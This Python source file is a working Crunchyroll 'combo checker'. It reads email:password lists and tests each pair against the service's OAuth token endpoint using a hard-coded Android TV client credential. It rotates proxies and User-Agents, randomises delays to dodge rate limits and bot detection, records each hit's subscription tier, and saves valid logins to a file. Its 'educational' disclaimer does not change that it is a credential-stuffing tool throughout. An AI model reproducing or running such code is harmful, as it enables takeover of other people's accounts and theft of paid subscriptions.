"""
Crunchyroll account checker (CLI).

POST https://beta-api.crunchyroll.com/auth/v1/token with grant_type=password using
Android TV OAuth client headers (password grant is rejected for many mobile client IDs).

For personal / educational testing only. Automated checks may hit rate limits or blocks.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import random
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from enum import Enum
from typing import Callable, Dict, Iterable, Iterator, List, Optional

import requests
from colorama import Fore, Style, init

init(autoreset=False)

DEFAULT_AUTH_HEADER = (
    "Basic bzd1b3d5N3E0bGdsdGJhdnloanE6bHFyakVUTng2Vzd1Um5wY0RtOHdSVmo4QkNoakMxZXI="
)
TOKEN_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
ACCOUNTS_ME_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
APP_VERSION = "3.58.0"
ANDROID_TV_BUILD = "22336"
REQUEST_TIMEOUT = 30

# Rotate User-Agent / client fingerprints (Android TV + mobile app style).
USER_AGENTS = [
    f"Crunchyroll/{APP_VERSION} ANDROIDTV/{ANDROID_TV_BUILD}",
    f"Crunchyroll/{APP_VERSION} android/13",
    f"Crunchyroll/{APP_VERSION} okhttp/4.12.0",
    "Mozilla/5.0 (Linux; Android 13; TV) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Crunchyroll",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,es;q=0.5",
]

# 429 retries: wait 2s, 4s, 8s, 16s, 32s (max 5 retries after first 429).
BACKOFF_429_SEC = [2, 4, 8, 16, 32]

# Inter-check delay range (seconds); avoids fixed patterns.
DELAY_MIN_SEC = 1.5
DELAY_MAX_SEC = 5.0

# Batching: reuse one HTTP session per batch, then pause + fresh session (no browser — requests.Session).
BATCH_SIZE = 10
BATCH_PAUSE_MIN_SEC = 8.0
BATCH_PAUSE_MAX_SEC = 22.0

MAX_ACCOUNTS_PER_RUN = 300


def _authorization_header() -> str:
    return os.environ.get("CRUNCHYROLL_AUTH", DEFAULT_AUTH_HEADER).strip()


class CheckStatus(str, Enum):
    VALID = "valid"
    INVALID = "invalid"
    ERROR = "error"
    BAD_FORMAT = "bad_format"


@dataclass(frozen=True)
class CheckResult:
    status: CheckStatus
    email: str
    password: str
    message: str = ""
    subscription: str = ""

    @property
    def combo(self) -> str:
        return f"{self.email}:{self.password}"


def print_banner() -> None:
    banner = f"""
{Fore.GREEN}╔═══════════════════════════════════════════════════╗
║                                                   ║
║   Crunchyroll Account Checker                     ║
║   Educational / personal use only                 ║
║                                                   ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)


def _normalize_proxy_url(url: str) -> str:
    u = url.strip()
    if not u:
        return ""
    if "://" not in u:
        u = f"http://{u}"
    return u


def _proxy_dict_from_url(url: Optional[str]) -> Optional[Dict[str, str]]:
    if not url:
        return None
    u = _normalize_proxy_url(url)
    if not u:
        return None
    return {"http": u, "https": u}


def _random_browser_headers(auth: str) -> dict[str, str]:
    if not auth.lower().startswith("basic "):
        auth = f"Basic {auth}"
    return {
        "Authorization": auth,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
    }


def _jwt_payload_dict(jwt_str: str) -> dict:
    try:
        parts = jwt_str.split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        pad = "=" * (-len(payload) % 4)
        raw = base64.urlsafe_b64decode(payload + pad)
        out = json.loads(raw.decode("utf-8"))
        return out if isinstance(out, dict) else {}
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return {}


def _is_generic_status_label(s: str) -> bool:
    """True for account status / marketing lines, not a plan type (Free, Premium, Mega Fan, …)."""
    if not s or not isinstance(s, str):
        return True
    t = s.strip().lower()
    if not t:
        return True
    if t in (
        "active",
        "inactive",
        "unknown",
        "none",
        "n/a",
        "na",
        "valid",
        "subscription active",
        "subscription_active",
        "active subscription",
    ):
        return True
    plan_kw = ("premium", "fan", "mega", "trial", "family", "free", "ultimate", "hime", "paid")
    if any(k in t for k in plan_kw):
        return False
    if "subscription" in t and "active" in t:
        return True
    return False


def _sanitize_subscription_label(s: str) -> str:
    if not s or not isinstance(s, str):
        return ""
    s = s.strip()
    if _is_generic_status_label(s):
        return ""
    return s


def _slug_to_label(s: str) -> str:
    s = (s or "").strip().lower().replace("-", "_").replace(" ", "_")
    mapping = {
        "free": "Free",
        "fan": "Fan",
        "mega_fan": "Mega Fan",
        "megafan": "Mega Fan",
        "premium": "Premium",
        "trial": "Trial",
        "ultimate_fan": "Ultimate Fan",
        "family": "Family",
        "hime": "Hime",
        "none": "Free",
    }
    if s in mapping:
        return mapping[s]
    if "mega" in s and "fan" in s:
        return "Mega Fan"
    if "trial" in s:
        return "Trial"
    if "family" in s:
        return "Family"
    if "premium" in s or "paid" in s:
        return "Premium"
    if "free" in s:
        return "Free"
    out = s.replace("_", " ").title() if s else ""
    if _is_generic_status_label(out):
        return ""
    return out


def _infer_subscription_from_dict(data: dict) -> str:
    """Best-effort label from Crunchyroll account / token JSON."""
    if data.get("premium") is True or data.get("is_premium") is True:
        return "Premium"

    for key in (
        "subscription_type",
        "tier",
        "plan",
        "product",
        "sku",
        "membership_type",
        "fan_status",
    ):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            lbl = _slug_to_label(v)
            if lbl:
                return lbl
        if isinstance(v, dict):
            for subk in ("tier", "plan", "name", "type", "code"):
                inner = v.get(subk)
                if isinstance(inner, str) and inner.strip():
                    lbl = _slug_to_label(inner)
                    if lbl:
                        return lbl

    sub = data.get("subscription") or data.get("membership")
    if isinstance(sub, dict):
        for subk in ("tier", "plan", "name", "type"):
            inner = sub.get(subk)
            if isinstance(inner, str) and inner.strip():
                lbl = _slug_to_label(inner)
                if lbl:
                    return lbl
    if isinstance(sub, str) and sub.strip():
        cand = _slug_to_label(sub) or sub.strip()
        return _sanitize_subscription_label(cand)

    blob = json.dumps(data).lower()
    if "mega_fan" in blob or "megafan" in blob:
        return "Mega Fan"
    if "trial" in blob and "subscription" in blob:
        return "Trial"
    if "fan_membership" in blob or '"fan"' in blob:
        if "mega" in blob:
            return "Mega Fan"
        return "Fan"
    if "free" in blob and "premium" not in blob and "fan" not in blob:
        return "Free"
    if "premium" in blob:
        return "Premium"

    return ""


def _deep_find_subscription_tier(data: dict, depth: int = 0, max_depth: int = 10) -> str:
    """Walk nested account JSON for tier/plan fields; ignores generic status strings."""
    if depth > max_depth or not isinstance(data, dict):
        return ""
    tier_keys = (
        "subscription_type",
        "tier",
        "plan",
        "product",
        "sku",
        "membership_type",
        "fan_status",
        "plan_name",
        "offer_code",
        "package_code",
        "billing_plan",
    )
    for k in tier_keys:
        if k not in data:
            continue
        v = data[k]
        if isinstance(v, str) and v.strip():
            lbl = _sanitize_subscription_label(_slug_to_label(v))
            if lbl:
                return lbl
        if isinstance(v, dict):
            inner = _deep_find_subscription_tier(v, depth + 1, max_depth)
            if inner:
                return inner
    for v in data.values():
        if isinstance(v, dict):
            inner = _deep_find_subscription_tier(v, depth + 1, max_depth)
            if inner:
                return inner
        elif isinstance(v, list):
            for item in v:
                if isinstance(item, dict):
                    inner = _deep_find_subscription_tier(item, depth + 1, max_depth)
                    if inner:
                        return inner
    return ""


def _fetch_subscription_label(
    sess: requests.Session,
    access_token: str,
    token_body: Optional[dict] = None,
) -> str:
    def _ok(lbl: str) -> bool:
        return bool(_sanitize_subscription_label(lbl))

    # Hints from token response (id_token JWT, embedded objects)
    if token_body and isinstance(token_body, dict):
        id_tok = token_body.get("id_token")
        if isinstance(id_tok, str) and id_tok:
            claims = _jwt_payload_dict(id_tok)
            label = _infer_subscription_from_dict(claims)
            if _ok(label):
                return _sanitize_subscription_label(label)
            label = _deep_find_subscription_tier(claims)
            if _ok(label):
                return _sanitize_subscription_label(label)
        for k in ("crm_profile", "account", "profile"):
            nested = token_body.get(k)
            if isinstance(nested, dict):
                label = _infer_subscription_from_dict(nested)
                if _ok(label):
                    return _sanitize_subscription_label(label)
                label = _deep_find_subscription_tier(nested)
                if _ok(label):
                    return _sanitize_subscription_label(label)
        label = _infer_subscription_from_dict(token_body)
        if _ok(label):
            return _sanitize_subscription_label(label)
        label = _deep_find_subscription_tier(token_body)
        if _ok(label):
            return _sanitize_subscription_label(label)

    # Access token JWT often carries CRM / tier claims (not only id_token).
    if isinstance(access_token, str) and access_token:
        claims = _jwt_payload_dict(access_token)
        if claims:
            label = _infer_subscription_from_dict(claims)
            if _ok(label):
                return _sanitize_subscription_label(label)
            label = _deep_find_subscription_tier(claims)
            if _ok(label):
                return _sanitize_subscription_label(label)

    try:
        r = sess.get(
            ACCOUNTS_ME_URL,
            headers={
                "Authorization": f"Bearer {access_token}",
                "Accept": "application/json",
                "User-Agent": random.choice(USER_AGENTS),
            },
            timeout=20,
        )
        if r.status_code != 200:
            return "Unknown"
        data = r.json()
        if not isinstance(data, dict):
            return "Unknown"
        label = _infer_subscription_from_dict(data)
        if _ok(label):
            return _sanitize_subscription_label(label)
        label = _deep_find_subscription_tier(data)
        if _ok(label):
            return _sanitize_subscription_label(label)
        return "Unknown"
    except (requests.RequestException, ValueError, TypeError, json.JSONDecodeError):
        return "Unknown"


def check_credentials(
    email: str,
    password: str,
    proxies: Optional[Dict[str, str]] = None,
    session: Optional[requests.Session] = None,
) -> CheckResult:
    """
    POST auth/v1/token. Reuses ``session`` for cookies; creates one if omitted.
    Retries on HTTP 429 with exponential backoff. Detects CAPTCHA / odd redirects.
    """
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return CheckResult(CheckStatus.BAD_FORMAT, email, password, "empty email or password", "")

    sess = session or requests.Session()
    if proxies:
        sess.proxies.update(proxies)

    device_id = str(uuid.uuid4())
    payload = {
        "username": email,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "Android TV",
        "device_type": "Android TV",
    }
    auth = _authorization_header()

    response: Optional[requests.Response] = None
    for attempt in range(6):
        headers = _random_browser_headers(auth)
        try:
            response = sess.post(
                TOKEN_URL,
                data=payload,
                headers=headers,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True,
            )
        except requests.RequestException as e:
            return CheckResult(CheckStatus.ERROR, email, password, str(e), "")

        if response.status_code == 429:
            if attempt < 5:
                time.sleep(BACKOFF_429_SEC[attempt] + random.uniform(0.0, 0.5))
                continue
            return CheckResult(
                CheckStatus.ERROR,
                email,
                password,
                "HTTP 429 Too Many Requests (max retries)",
                "",
            )
        break

    assert response is not None
    r = response

    if len(r.history) > 3:
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            f"Unusual redirect chain ({len(r.history)} hops)",
            "",
        )

    raw_text = (r.text or "").lower()
    if "captcha" in raw_text or "cf-challenge" in raw_text or "challenge-platform" in raw_text:
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            "Possible CAPTCHA or bot challenge — pause and retry later",
            "",
        )

    try:
        body = r.json()
    except (json.JSONDecodeError, ValueError):
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            f"non-JSON response HTTP {r.status_code}",
            "",
        )

    if r.status_code == 200 and isinstance(body, dict) and body.get("access_token"):
        sub = _fetch_subscription_label(sess, str(body["access_token"]), body)
        return CheckResult(CheckStatus.VALID, email, password, "", sub)

    err = ""
    if isinstance(body, dict):
        err = str(body.get("error") or body.get("error_code") or "")
        code = str(body.get("code") or "")
        hint = body.get("error_description") or body.get("message")
        parts = [p for p in (err, code, hint) if p]
        err = " | ".join(parts) if parts else str(body)

    low = (err or "").lower()
    if "invalid_client" in low or "client_inactive" in low:
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            "invalid_client (update CRUNCHYROLL_AUTH - see bot.py header comment)",
            "",
        )

    if "unsupported_grant_type" in low:
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            "unsupported_grant_type (wrong OAuth client; this script expects Android TV credentials)",
            "",
        )

    if (
        any(x in low for x in ("invalid_grant", "invalid_credentials", "incorrect"))
        or "invalid_credentials" in low
        or r.status_code == 401
    ):
        return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {r.status_code}", "")

    if r.status_code >= 500 or "cloudflare" in str(body).lower():
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            err or f"HTTP {r.status_code} (server or protection)",
            "",
        )

    return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {r.status_code}", "")


def check_combo_line_with_session(
    line: str,
    session: requests.Session,
    extra_delay: float = 0.0,
) -> CheckResult:
    """Run one check using an existing session (same TCP/cookie jar for the batch)."""
    line = line.strip()
    if ":" not in line:
        return CheckResult(CheckStatus.BAD_FORMAT, "", "", f"invalid format: {line!r}", "")
    email, password = line.split(":", 1)
    result = check_credentials(email, password, proxies=None, session=session)
    if extra_delay > 0:
        time.sleep(extra_delay * random.uniform(0.85, 1.15))
    return result


def check_combo_line(
    line: str,
    proxy_url: Optional[str] = None,
    extra_delay: float = 0.0,
) -> CheckResult:
    line = line.strip()
    if ":" not in line:
        return CheckResult(CheckStatus.BAD_FORMAT, "", "", f"invalid format: {line!r}", "")
    email, password = line.split(":", 1)
    proxies = _proxy_dict_from_url(proxy_url)
    sess = requests.Session()
    if proxies:
        sess.proxies.update(proxies)
    try:
        result = check_credentials(email, password, proxies=proxies, session=sess)
    finally:
        sess.close()
    if extra_delay > 0:
        time.sleep(extra_delay * random.uniform(0.85, 1.15))
    return result


def _clip_lines(combos: Iterable[str], max_n: int = MAX_ACCOUNTS_PER_RUN) -> List[str]:
    out: List[str] = []
    for c in combos:
        s = str(c).strip()
        if s:
            out.append(s)
        if len(out) >= max_n:
            break
    return out


def iter_checks_sequential(
    combos: Iterable[str],
    proxy_urls: Optional[List[str]] = None,
    extra_delay: float = 0.0,
) -> Iterator[CheckResult]:
    """
    One account at a time. Random pause between checks.

    Batching (HTTP session, not a browser): reuse one ``requests.Session`` for up to
    ``BATCH_SIZE`` accounts (shared connection/cookies), then close it, pause, and open
    a fresh session — similar to a "soft restart". Progress continues across batches.
    Proxies rotate at each new batch and on errors when configured.
    """
    lines = _clip_lines(combos, MAX_ACCOUNTS_PER_RUN)
    cleaned = [_normalize_proxy_url(u) for u in (proxy_urls or []) if _normalize_proxy_url(u)]
    idx = 0
    session: Optional[requests.Session] = None

    try:
        for i, line in enumerate(lines):
            if i > 0 and i % BATCH_SIZE == 0:
                if session is not None:
                    session.close()
                    session = None
                time.sleep(
                    random.uniform(BATCH_PAUSE_MIN_SEC, BATCH_PAUSE_MAX_SEC)
                    + max(0.0, extra_delay) * 0.35
                )

            if session is None:
                session = requests.Session()
                if cleaned:
                    if i > 0:
                        idx = (idx + 1) % len(cleaned)
                    pd = _proxy_dict_from_url(cleaned[idx])
                    if pd:
                        session.proxies.update(pd)

            if i > 0:
                time.sleep(random.uniform(DELAY_MIN_SEC, DELAY_MAX_SEC) + max(0.0, extra_delay))

            result = check_combo_line_with_session(line, session, extra_delay=0.0)

            if result.status == CheckStatus.ERROR and cleaned:
                idx = (idx + 1) % len(cleaned)
                session.proxies.clear()
                pd = _proxy_dict_from_url(cleaned[idx])
                if pd:
                    session.proxies.update(pd)

            yield result
    finally:
        if session is not None:
            session.close()


@dataclass
class RunSummary:
    total: int
    valid: int
    invalid: int
    errors: int
    bad_format: int
    seconds: float
    valid_lines: List[str]
    valid_entries: List[Dict[str, str]]


def build_summary(results: List[CheckResult], elapsed: float) -> RunSummary:
    counts = {CheckStatus.VALID: 0, CheckStatus.INVALID: 0, CheckStatus.ERROR: 0, CheckStatus.BAD_FORMAT: 0}
    valid_entries: List[Dict[str, str]] = []
    for r in results:
        counts[r.status] = counts.get(r.status, 0) + 1
        if r.status == CheckStatus.VALID:
            valid_entries.append(
                {"combo": r.combo, "subscription": (r.subscription or "").strip() or ""},
            )
    valid_lines = [e["combo"] for e in valid_entries]
    return RunSummary(
        total=len(results),
        valid=counts[CheckStatus.VALID],
        invalid=counts[CheckStatus.INVALID],
        errors=counts[CheckStatus.ERROR],
        bad_format=counts[CheckStatus.BAD_FORMAT],
        seconds=elapsed,
        valid_lines=valid_lines,
        valid_entries=valid_entries,
    )


def run_checks(
    combos: Iterable[str],
    max_workers: int,
    on_result: Optional[Callable[[CheckResult], None]] = None,
    proxy_urls: Optional[List[str]] = None,
    extra_delay: float = 0.0,
) -> RunSummary:
    """Parallel checker (CLI). Caps workers at 2 for lighter load."""
    combos_list = _clip_lines(combos, MAX_ACCOUNTS_PER_RUN)
    valid_lines: List[str] = []
    valid_entries: List[Dict[str, str]] = []
    counts = {CheckStatus.VALID: 0, CheckStatus.INVALID: 0, CheckStatus.ERROR: 0, CheckStatus.BAD_FORMAT: 0}
    workers = max(1, min(2, max_workers))

    cleaned = [_normalize_proxy_url(u) for u in (proxy_urls or []) if _normalize_proxy_url(u)]
    start = time.perf_counter()

    def work(line: str) -> CheckResult:
        pu = random.choice(cleaned) if cleaned else None
        return check_combo_line(line, proxy_url=pu, extra_delay=extra_delay)

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(work, line): line for line in combos_list}
        for fut in as_completed(futures):
            result = fut.result()
            counts[result.status] = counts.get(result.status, 0) + 1
            if result.status == CheckStatus.VALID:
                valid_lines.append(result.combo)
                valid_entries.append(
                    {"combo": result.combo, "subscription": (result.subscription or "").strip() or ""},
                )
            if on_result:
                on_result(result)

    elapsed = time.perf_counter() - start
    return RunSummary(
        total=len(combos_list),
        valid=counts[CheckStatus.VALID],
        invalid=counts[CheckStatus.INVALID],
        errors=counts[CheckStatus.ERROR],
        bad_format=counts[CheckStatus.BAD_FORMAT],
        seconds=elapsed,
        valid_lines=valid_lines,
        valid_entries=valid_entries,
    )


def run_checks_collecting(
    combos: Iterable[str],
    max_workers: int,
    proxy_urls: Optional[List[str]] = None,
    extra_delay: float = 0.0,
) -> tuple[RunSummary, List[CheckResult]]:
    """API default: sequential human-like pacing (ignores max_workers for ordering)."""
    start = time.perf_counter()
    results = list(iter_checks_sequential(combos, proxy_urls, extra_delay))
    elapsed = time.perf_counter() - start
    summary = build_summary(results, elapsed)
    return summary, results


def check_result_to_dict(r: CheckResult) -> dict:
    return {
        "status": r.status.value,
        "email": r.email,
        "password": r.password,
        "message": r.message,
        "combo": r.combo,
        "subscription": r.subscription or "",
    }


def format_result_line(result: CheckResult) -> str:
    if result.status == CheckStatus.BAD_FORMAT:
        return f"{Fore.YELLOW}[WARN] {result.message}{Style.RESET_ALL}"
    if result.status == CheckStatus.ERROR:
        return f"{Fore.YELLOW}[ERROR] {result.email}:{result.password} - {result.message}{Style.RESET_ALL}"
    if result.status == CheckStatus.VALID:
        sub = f" [{result.subscription}]" if result.subscription else ""
        return f"{Fore.GREEN}[VALID] {result.combo}{sub}{Style.RESET_ALL}"
    extra = f" ({result.message})" if result.message else ""
    return f"{Fore.RED}[INVALID] {result.combo}{extra}{Style.RESET_ALL}"


def write_valid_file(path: str, lines: List[str]) -> None:
    directory = os.path.dirname(os.path.abspath(path))
    if directory:
        os.makedirs(directory, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        for line in lines:
            f.write(line + "\n")


def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Crunchyroll combo checker (educational).")
    p.add_argument(
        "-c",
        "--combo",
        metavar="FILE",
        help="Path to combo file (email:password per line). If omitted, you will be prompted.",
    )
    p.add_argument(
        "-t",
        "--threads",
        type=int,
        default=2,
        help="Worker threads for parallel mode (1-2). Default: 2",
    )
    p.add_argument(
        "-o",
        "--output",
        default="valid_crunchyroll.txt",
        help="Output file for valid hits. Default: valid_crunchyroll.txt",
    )
    p.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="Only print summary (no per-line output).",
    )
    p.add_argument("--no-banner", action="store_true", help="Skip ASCII banner.")
    p.add_argument(
        "--proxy",
        action="append",
        dest="proxies",
        metavar="URL",
        help="HTTP(S) proxy URL (repeat for multiple). Example: http://user:pass@host:8080",
    )
    p.add_argument(
        "--proxies-file",
        metavar="FILE",
        help="File with one proxy URL per line (rotates randomly per request).",
    )
    p.add_argument(
        "--delay",
        type=float,
        default=0.0,
        metavar="SEC",
        help="Extra seconds added to random inter-check delay. Default: 0",
    )
    p.add_argument(
        "--sequential",
        action="store_true",
        help="One check at a time with random pauses (slower, gentler on APIs).",
    )
    return p.parse_args(argv)


def main(argv: Optional[List[str]] = None) -> int:
    args = parse_args(argv)

    if not args.no_banner:
        print_banner()

    combo_file = args.combo
    if not combo_file:
        combo_file = input(
            f"{Fore.CYAN}Enter the path to your combo file (email:password): {Style.RESET_ALL}"
        ).strip()

    if not combo_file or not os.path.isfile(combo_file):
        print(f"{Fore.RED}[ERROR] File not found: {combo_file!r}{Style.RESET_ALL}")
        return 1

    with open(combo_file, "r", encoding="utf-8", errors="replace") as f:
        combos = [line.strip() for line in f if line.strip()]

    proxy_urls: List[str] = list(args.proxies or [])
    if args.proxies_file:
        if not os.path.isfile(args.proxies_file):
            print(f"{Fore.RED}[ERROR] Proxies file not found: {args.proxies_file!r}{Style.RESET_ALL}")
            return 1
        with open(args.proxies_file, "r", encoding="utf-8", errors="replace") as pf:
            proxy_urls.extend(line.strip() for line in pf if line.strip())

    proxy_urls = [u for u in proxy_urls if u.strip()]
    if proxy_urls:
        print(f"{Fore.BLUE}[INFO] Using {len(proxy_urls)} proxy URL(s){Style.RESET_ALL}")
    if args.delay > 0:
        print(f"{Fore.BLUE}[INFO] Extra delay add-on: {args.delay}s per gap{Style.RESET_ALL}")

    if len(combos) > MAX_ACCOUNTS_PER_RUN:
        print(
            f"{Fore.YELLOW}[WARN] Only first {MAX_ACCOUNTS_PER_RUN} lines will be processed.{Style.RESET_ALL}"
        )
        combos = combos[:MAX_ACCOUNTS_PER_RUN]

    def on_result(result: CheckResult) -> None:
        if not args.quiet:
            print(format_result_line(result))

    if args.sequential:
        print(f"{Fore.BLUE}[INFO] Sequential mode · {len(combos)} lines{Style.RESET_ALL}")
        start = time.perf_counter()
        collected: List[CheckResult] = []
        for r in iter_checks_sequential(combos, proxy_urls or None, args.delay):
            collected.append(r)
            on_result(r)
        elapsed = time.perf_counter() - start
        summary = build_summary(collected, elapsed)
    else:
        threads = max(1, min(2, args.threads))
        print(f"{Fore.BLUE}[INFO] Loaded {len(combos)} lines — parallel workers: {threads}{Style.RESET_ALL}")
        summary = run_checks(
            combos,
            threads,
            on_result=on_result,
            proxy_urls=proxy_urls or None,
            extra_delay=args.delay,
        )

    if summary.valid_lines:
        write_valid_file(args.output, summary.valid_lines)

    print(f"\n{Fore.BLUE}=== Summary ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}Total lines: {summary.total}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Valid: {summary.valid}{Style.RESET_ALL}")
    print(f"{Fore.RED}Invalid: {summary.invalid}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Errors (network/timeout): {summary.errors}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Bad format: {summary.bad_format}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Time: {summary.seconds:.2f}s{Style.RESET_ALL}")
    if summary.valid:
        print(f"{Fore.GREEN}Saved {summary.valid} to {args.output}{Style.RESET_ALL}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
